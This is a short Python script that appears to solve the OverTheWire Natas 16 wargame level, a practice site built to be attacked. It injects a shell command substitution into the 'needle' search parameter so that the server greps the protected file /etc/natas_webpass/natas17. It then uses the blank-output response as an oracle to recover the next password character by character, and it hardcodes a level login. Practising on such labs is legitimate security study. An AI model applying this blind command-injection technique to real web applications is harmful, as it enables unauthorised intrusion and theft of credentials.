import requests, string
from requests.auth import HTTPBasicAuth

chars = string.ascii_letters + string.digits
password = ""

for i in range(1, 33):
	print("progress " + str(i) + " / 32")
	for c in chars:
		r = requests.get("http://natas16.natas.labs.overthewire.org/index.php?needle=sonatas$(grep ^" + password + c + " /etc/natas_webpass/natas17)&submit=Search", auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))

		if r.text.find("Output:\n<pre>\n</pre>") != -1:
			password += c
		
print(password)